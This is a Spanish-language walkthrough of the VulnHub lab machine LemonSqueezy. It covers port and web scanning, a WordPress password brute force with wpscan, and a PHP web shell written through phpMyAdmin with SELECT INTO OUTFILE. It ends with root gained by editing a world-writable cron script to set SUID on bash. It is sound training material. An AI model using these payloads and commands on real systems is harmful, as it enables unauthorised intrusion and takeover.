---
title: LemonSqueezy
published: true
---

---

[Lemonsqueezy1](@https://www.vulnhub.com/entry/lemonsqueezy-1,473/)

La descripcion comenta que agreguemos ‘lemonsqueezy’ al hosts.

## Intrusion

Empiezo haciendo un escaneo con Nmap para ver puertos de la maquina.

```bash
>Nmap scan report for lemonsqueezy (192.168.1.32)
Host is up (0.0014s latency).
PORT   STATE SERVICE
80/tcp open  http
```

![](https://eidd3.github.io//assets/img/LemonSqueezy1/img.png)

Con Nikto busco posibles vulnerabilidades o recursos en la pagina.

```bash
nikto -host 192.168.1.32
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          192.168.1.32
+ Target Hostname:    lemonsqueezy
+ Target Port:        80
+ Start Time:         2023-02-08 18:59:50 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS 
+ OSVDB-3092: /manual/: Web server manual found.
+ /wordpress/: A Wordpress installation was found.
+ /phpmyadmin/: phpMyAdmin directory found
---------------------------------------------------------------------------
+ End Time:           2023-02-08 19:00:08 (GMT-3) (18 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Reporta 2 directorios interesantes.

![](https://eidd3.github.io//assets/img/LemonSqueezy1/img1.png)

![](https://eidd3.github.io//assets/img/LemonSqueezy1/img2.png)


Con wpscan busco posibles usuarios para tratar de ingresar en el panel de phpmyadmin o en el wordpress.

```bash
wpscan --url http://192.168.1.32/wordpress/ -e u
[sudo] password for eddie: 
_______________________________________________________________

[+] URL: http://192.168.1.32/wordpress/ [192.168.1.32]

Interesting Finding(s):

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <====================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] lemon
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] orange
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)


Me reporta 2 usuarios, pero todavia no tengo ninguna contraseña para probar, por lo que lanzo otro escaneo para hacer fuerza bruta y tratar de conseguir contraseñas.

wpscan --url http://192.168.1.32/wordpress/ -U orange -P /usr/share/wordlists/rockyou.txt
_______________________________________________________________

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - orange / ginger                                                                                                                                      
Trying orange / sweetie Time: 00:00:02 <==========================================================================> (165 / 14344557)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: orange, Password: ginger

```

| User         | Password          |
|:-------------|:------------------|
| orange       | ginger		   |


Con estas credenciales puedo iniciar sesion en el panel de log in de wordpress.

![](https://eidd3.github.io//assets/img/LemonSqueezy1/img3.png)

Al ingresar ya se ve algo raro, un nota que dice “mantener esto seguro” y lo que parace ser una contraseña.

![](https://eidd3.github.io//assets/img/LemonSqueezy1/img4.png)

Con esta nueva contraseña se puede tratar de ingresar al panel de phpmyadmin como el usuario orange o lemon.

![](https://eidd3.github.io//assets/img/LemonSqueezy1/img5.png)

Este usuario y contraseña son validos, por lo que me deja ingresar a phpmyadmin.

Una vez dentro de PhpMyAdmin la idea es subir una shell al servidor web; ya que puedo ver la base de datos ‘wordpress’ voy a tratar de crear una consulta SQL maliciosa que en una ruta dada de la pagina pueda ejecutar comandos.

![](https://eidd3.github.io//assets/img/LemonSqueezy1/img6.png)

Primero creamos la consulta, vamos a la pestaña SQL que es donde vamos a ingresar el codigo de la consulta y agregamos esa linea para poder ejecutar comandos en la ruta http://192.168.1.32/wordpress/shell.php con el parametro cmd. 

```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/wordpress/shell.php"
```

![](https://eidd3.github.io//assets/img/LemonSqueezy1/img7.png)

Ahora que puedo ejecutar comandos queda entablar una reverse shell.

![](https://eidd3.github.io//assets/img/LemonSqueezy1/img8.png)


## Escalando Privilegios

Si vemos las tareas cron que se ejecutan en el sistema vemos que root ejecuta cada 2 minutos logrotate.

```bash
bash-4.4$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    /etc/logrotate.d/logrotate
```

```bash
bash-4.4$ cat /etc/logrotate.d/logrotate 
#!/usr/bin/env python
import os
import sys
try:
   os.system('rm -r /tmp/* ')
except:
    sys.exit()
```

```bash
bash-4.4$ ls -la /etc/logrotate.d/logrotate 
-rwxrwxrwx 1 root root 134 Feb  9 06:56 /etc/logrotate.d/logrotate
```

El archivo tiene permisos 777 por lo que otro pueden editar el archivo, asi que con la libreria os importada puedo hacer que root le de permisos SUID a la bash y esperar que ejecute la tarea para convertirme en root.

```bash
bash-4.4$ cat /etc/logrotate.d/logrotate 
#!/usr/bin/env python
import os
import sys
os.system('chmod u+s /bin/bash')
try:
   os.system('rm -r /tmp/* ')
except:
    sys.exit()
```

```bash
bash-4.4$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1099016 May 16  2017 /bin/bash
bash-4.4$ bash -p
bash-4.4# whoami
root
bash-4.4# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

